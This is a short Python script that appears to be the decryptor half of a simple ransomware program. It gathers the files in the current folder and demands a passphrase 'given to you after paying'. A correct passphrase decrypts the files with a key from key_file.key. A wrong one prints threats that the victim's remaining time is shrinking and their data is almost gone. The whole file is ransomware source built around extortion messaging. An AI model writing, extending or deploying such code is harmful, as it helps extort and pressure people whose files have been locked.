import os
from cryptography.fernet import Fernet

files_in_danger = []
fernet_key = Fernet.generate_key()
passphrase = "youwillneverguess"

for file in os.listdir():
	if file == "file_encryptor.py" or file == "key_file.key" or file == "file_decryptor.py":
		continue
	if os.path.isfile(file):
		files_in_danger.append(file)

with open("key_file.key", "rb") as key:
	secretkey = key.read()

user_passphrase = input("Enter the passphrase given to you after paying to decrypt the files\n")

if user_passphrase == passphrase:
	for file in files_in_danger:
		with open(file, "rb") as currentfile:
			content = currentfile.read()
		decrypted_content = Fernet(secretkey).decrypt(content)
		with open(file, "wb") as currentfile:
			currentfile.write(decrypted_content)
	print("Passphrase succes! Your files are decrypted")
	print("HAVE A NICE DAY!")
else:
	print("WRONG PASSPHRASE!")
	print("Your remaining time has decreased by 2 hours")
	print("Be careful... your data is almost gone...\n")
	print("Run python3 file_decryptor.py to try again")
